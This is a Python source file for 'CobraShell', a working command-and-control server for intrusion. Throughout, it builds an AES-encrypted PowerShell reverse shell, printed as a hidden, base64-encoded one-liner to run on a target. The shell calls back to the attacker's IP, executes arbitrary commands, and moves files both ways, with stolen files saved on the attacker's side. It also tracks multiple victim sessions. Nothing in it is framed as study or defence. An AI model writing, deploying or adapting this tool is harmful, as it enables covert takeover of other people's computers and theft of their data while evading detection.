import os
import collections
import collections.abc
collections.Callable = collections.abc.Callable
import socket
import threading
import re
import base64
import time
import pyfiglet
from colorama import Fore, Style, init
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
try:
    import readline  
except ImportError:
    try:
        import pyreadline as readline 
    except ImportError:
        readline = None  

init(autoreset=True)

key_file = "aes_keys.txt"

if os.path.exists(key_file):
    with open(key_file, "r") as f:
        key_b64 = f.readline().strip()
        iv_b64 = f.readline().strip()
        AES_KEY = base64.b64decode(key_b64)
        AES_IV = base64.b64decode(iv_b64)
else:
    AES_KEY = os.urandom(32)
    AES_IV = os.urandom(16)
    with open(key_file, "w") as f:
        f.write(base64.b64encode(AES_KEY).decode() + "\n")
        f.write(base64.b64encode(AES_IV).decode() + "\n")

class AESCipher:
    def __init__(self, key, iv):
        self.key = key
        self.iv = iv

    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        return cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))

    def decrypt(self, enc_data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        return unpad(cipher.decrypt(enc_data), AES.block_size).decode('utf-8', 'ignore')

class TerminalUI:
    @staticmethod
    def banner():
        os.system('cls' if os.name == 'nt' else 'clear')
        final_banner = pyfiglet.figlet_format("CobraShell", font="slant")
        print(Fore.RED + final_banner + Style.RESET_ALL)
        print(Fore.GREEN + "CobraShell!" + Style.RESET_ALL)

    @staticmethod
    def connection_alert(ip, port):
        print(Fore.YELLOW + f"\n[+] New venomous snake connected: {ip}:{port}")

class CobraC2:
    def __init__(self, port=4444):
        self.connections = []
        self.listener_port = port
        self.server_socket = None
        self.running = True
        self.connection_lock = threading.Lock()
        self.cipher = AESCipher(AES_KEY, AES_IV)
        TerminalUI.banner()
        self.setup_listener()

    def setup_listener(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.server_socket.bind(("0.0.0.0", self.listener_port))
            self.server_socket.listen(5)
            print(f"{Fore.GREEN}[+] Cobra C2 listening on port {self.listener_port}...")
        except Exception as e:
            print(f"{Fore.RED}[-] Listener failed: {str(e)}")
            exit(1)

    def generate_payload(self):
        attacker_ip = input(f"{Fore.CYAN}[?] Enter your IP for the payload: ")

        key_b64 = base64.b64encode(self.cipher.key).decode()
        iv_b64 = base64.b64encode(self.cipher.iv).decode()

        ps_script = f"""
$K = [System.Convert]::FromBase64String('{key_b64}');
$IV = [System.Convert]::FromBase64String('{iv_b64}');
$client = New-Object System.Net.Sockets.TCPClient("{attacker_ip}", {self.listener_port});
$stream = $client.GetStream();
$aes = New-Object System.Security.Cryptography.AesManaged;
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
$aes.Key = $K;
$aes.IV = $IV;
$encryptor = $aes.CreateEncryptor();
$decryptor = $aes.CreateDecryptor();
$buffer = New-Object byte[](1024);

while($true){{
    try {{
        $read = $stream.Read($buffer, 0, $buffer.Length);
        if($read -le 0){{break;}}
        $decrypted_bytes = $decryptor.TransformFinalBlock($buffer, 0, $read);
        $cmd = [System.Text.Encoding]::UTF8.GetString($decrypted_bytes).Trim();

        if ($cmd.StartsWith("download")) {{
            try {{
                $filepath = $cmd.Split(' ')[1];
                $file_content = [System.IO.File]::ReadAllBytes($filepath);
                $encoded_content = [System.Convert]::ToBase64String($file_content);
                $output = "DOWNLOAD_SUCCESS:" + $encoded_content;
            }} catch {{
                $output = "DOWNLOAD_ERROR:" + $_.Exception.Message;
            }}
        }} elseif ($cmd.StartsWith("upload")) {{
             try {{
                $parts = $cmd.Split(' ', 3);
                $filepath = $parts[1];
                $file_content_b64 = $parts[2];
                $file_bytes = [System.Convert]::FromBase64String($file_content_b64);
                [System.IO.File]::WriteAllBytes($filepath, $file_bytes);
                $output = "UPLOAD_SUCCESS: File uploaded to " + $filepath;
            }} catch {{
                $output = "UPLOAD_ERROR:" + $_.Exception.Message;
            }}
        }} else {{
            $output = (IEX $cmd 2>&1 | Out-String);
        }}

        $response = $output + "CMD>" + (Get-Location).Path + "> ";
        $response_bytes = [System.Text.Encoding]::UTF8.GetBytes($response);
        $encrypted_response = $encryptor.TransformFinalBlock($response_bytes, 0, $response_bytes.Length);
        $stream.Write($encrypted_response, 0, $encrypted_response.Length);
        $stream.Flush();
    }} catch {{ Start-Sleep -Seconds 5 }}
}}
$client.Close();
"""
        encoded_payload = base64.b64encode(ps_script.encode('utf-16le')).decode()
        print(f"\n{Fore.GREEN}[+] Payload generated! Execute on target:")
        print(f"{Fore.YELLOW}powershell -nop -w hidden -e {encoded_payload}")

    def handle_agent(self, conn):
        try:
            while self.running:
                data = conn.recv(8192)
                if data:
                    decrypted_data = self.cipher.decrypt(data)
                    if decrypted_data.startswith("DOWNLOAD_SUCCESS:"):
                        b64_data = decrypted_data.replace("DOWNLOAD_SUCCESS:", "")
                        file_data = base64.b64decode(b64_data)
                        filename = f"download_{conn.getpeername()[0]}_{int(time.time())}.dat"
                        with open(filename, "wb") as f:
                            f.write(file_data)
                        print(f"{Fore.GREEN}\n[+] File downloaded successfully: {filename}")
                        print(f"\n{Fore.RED}CobraShell@{conn.getpeername()[0]}{Style.RESET_ALL} > ", end="")

                    elif decrypted_data.startswith("DOWNLOAD_ERROR:"):
                        print(f"{Fore.RED}\n[-] Download failed: {decrypted_data.replace('DOWNLOAD_ERROR:', '')}")
                        print(f"\n{Fore.RED}CobraShell@{conn.getpeername()[0]}{Style.RESET_ALL} > ", end="")
                    else:
                        print(f"\n{Fore.BLUE}[OUTPUT]{Style.RESET_ALL}\n{decrypted_data.strip()}")
                        print(f"\n{Fore.RED}CobraShell@{conn.getpeername()[0]}{Style.RESET_ALL} > ", end="")
        except Exception:
            pass 
        finally:
            with self.connection_lock:
                if conn in self.connections:
                    self.connections.remove(conn)
            conn.close()
            print(f"{Fore.YELLOW}\n[-] Snake at {conn.getpeername()[0]} shed its skin (disconnected).")

    def accept_connections(self):
        while self.running:
            try:
                conn, addr = self.server_socket.accept()
                TerminalUI.connection_alert(addr[0], addr[1])
                with self.connection_lock:
                    self.connections.append(conn)
            except Exception:
                if self.running:
                    pass

    def list_connections(self):
        print(f"\n{Fore.CYAN}--- Active Snakes ---{Style.RESET_ALL}")
        with self.connection_lock:
            if not self.connections:
                print("[!] No active connections.")
                return
            for i, conn in enumerate(self.connections):
                print(f"  {i}) {conn.getpeername()[0]}:{conn.getpeername()[1]}")
        print("-" * 21)

    def interact_with_agent(self, conn_index):
        try:
            with self.connection_lock:
                selected_conn = self.connections[conn_index]

            ip, port = selected_conn.getpeername()
            print(f"{Fore.GREEN}[+] Interacting with snake at {ip}. Type 'background' to return.")

            threading.Thread(target=self.handle_agent, args=(selected_conn,), daemon=True).start()

            initial_cmd_encrypted = self.cipher.encrypt("whoami")
            selected_conn.sendall(initial_cmd_encrypted)

            while True:
                cmd = input(f"\n{Fore.RED}CobraShell@{ip}{Style.RESET_ALL} > ") 
                if cmd.lower() in ["exit", "quit"]:
                    print(f"{Fore.YELLOW}[!] Sending kill signal... this might not work if shell is hung.")
                    cmd = "exit"

                if cmd.lower() == "background":
                    print(f"{Fore.YELLOW}[!] Moving session to background.")
                    break

                if cmd.startswith("upload"):
                    try:
                        _, local_path, remote_path = cmd.split(" ")
                        with open(local_path, "rb") as f:
                            file_content_b64 = base64.b64encode(f.read()).decode()
                        cmd_to_send = f"upload {remote_path} {file_content_b64}"
                        encrypted_cmd = self.cipher.encrypt(cmd_to_send)
                        selected_conn.sendall(encrypted_cmd)
                        continue
                    except Exception as e:
                        print(f"{Fore.RED}[-] Upload prep failed: {e}")
                        continue

                encrypted_cmd = self.cipher.encrypt(cmd)
                selected_conn.sendall(encrypted_cmd)

                if cmd.lower() == "exit":
                    selected_conn.close() 
                    break

        except IndexError:
            print(f"{Fore.RED}[-] Invalid selection.")
        except Exception as e:
            print(f"{Fore.RED}[-] Interaction error: {e}")
            with self.connection_lock:
                if selected_conn in self.connections:
                    self.connections.remove(selected_conn)

    def run(self):
        threading.Thread(target=self.accept_connections, daemon=True).start()
        while self.running:
            try:
                cmd = input(f"\n{Fore.RED}@CobraC2{Style.RESET_ALL} > ").strip().lower()
                if cmd == "exit":
                    self.running = False
                elif cmd == "generate":
                    self.generate_payload()
                elif cmd == "list":
                    self.list_connections()
                elif cmd.startswith("interact"):
                    try:
                        idx = int(cmd.split(" ")[1])
                        self.interact_with_agent(idx)
                    except (IndexError, ValueError):
                        print(f"{Fore.RED}[-] Usage: interact <session_id>")
                else:
                    print(f"""{Fore.CYAN}--- C2 Commands ---
generate   - Create PowerShell payload
list       - Show active connections
interact <id> - Interact with a connection
exit       - Shutdown server

--- In-Session Commands ---
upload <local> <remote> - Upload file
download <remote_file>  - Download file
background - Return to C2 prompt
exit/quit  - Terminate remote shell""")
            except KeyboardInterrupt:
                self.running = False

        print(f"\n{Fore.YELLOW}[!] Shutting down C2 server...")
        with self.connection_lock:
            for conn in self.connections:
                conn.close()
        self.server_socket.close()

if __name__ == "__main__":
    c2 = CobraC2()
    c2.run()
